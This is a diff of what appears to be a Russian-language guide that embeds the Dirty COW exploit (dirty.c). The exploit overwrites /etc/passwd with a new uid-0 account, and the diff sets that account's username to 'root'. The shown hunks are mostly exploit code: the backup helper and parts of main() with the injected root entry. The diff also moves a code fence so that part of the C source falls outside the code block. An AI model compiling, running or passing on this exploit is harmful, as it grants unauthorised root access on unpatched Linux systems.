@@ -165,7 +165,6 @@
      
      Создаем в каталоге файл dirty.c
      ```
-     //
      // This exploit uses the pokemon exploit of the dirtycow vulnerability
      // as a base and automatically generates a new passwd line.
      // The user will be prompted for the new password when the binary is run.
@@ -251,40 +250,40 @@
        printf("madvise %d\n\n", c);
      }
 
-int copy_file(const char *from, const char *to) {
-  // check if target file already exists
-  if(access(to, F_OK) != -1) {
-    printf("File %s already exists! Please delete it and run again\n",
-      to);
-    return -1;
-  }
+     int copy_file(const char *from, const char *to) {
+       // check if target file already exists
+       if(access(to, F_OK) != -1) {
+         printf("File %s already exists! Please delete it and run again\n",
+           to);
+         return -1;
+       }
 
-  char ch;
-  FILE *source, *target;
+       char ch;
+       FILE *source, *target;
 
-  source = fopen(from, "r");
-  if(source == NULL) {
-    return -1;
-  }
-  target = fopen(to, "w");
-  if(target == NULL) {
-     fclose(source);
-     return -1;
-  }
+       source = fopen(from, "r");
+       if(source == NULL) {
+         return -1;
+       }
+       target = fopen(to, "w");
+       if(target == NULL) {
+          fclose(source);
+          return -1;
+       }
 
-  while((ch = fgetc(source)) != EOF) {
-     fputc(ch, target);
-   }
+       while((ch = fgetc(source)) != EOF) {
+          fputc(ch, target);
+        }
 
-  printf("%s successfully backed up to %s\n",
-    from, to);
+       printf("%s successfully backed up to %s\n",
+         from, to);
 
-  fclose(source);
-  fclose(target);
+       fclose(source);
+       fclose(target);
 
-  return 0;
-}
-
+       return 0;
+     }
+```
 int main(int argc, char *argv[])
 {
   // backup file
@@ -295,7 +294,7 @@ int main(int argc, char *argv[])
 
   struct Userinfo user;
   // set values, change as needed
-  user.username = "firefart";
+  user.username = "root";
   user.user_id = 0;
   user.group_id = 0;
   user.info = "pwned";
@@ -357,5 +356,5 @@ int main(int argc, char *argv[])
     printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
     backup_filename, filename);
   return 0;
-}
-```    
+} 
+```
